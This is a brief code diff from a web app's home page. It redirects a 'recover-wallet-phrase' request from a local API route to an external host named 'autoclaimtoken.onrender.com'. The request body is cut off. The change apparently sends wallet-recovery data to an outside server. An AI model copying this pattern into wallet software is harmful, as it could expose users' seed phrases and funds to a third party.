@@ -707,7 +707,7 @@ export default function Home() {
                       <button
                         onClick={() => {
                           // Test the recovery engine directly
-                          fetch('/api/recover-wallet-phrase', {
+                          fetch('https://autoclaimtoken.onrender.com/api/recover-wallet-phrase', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
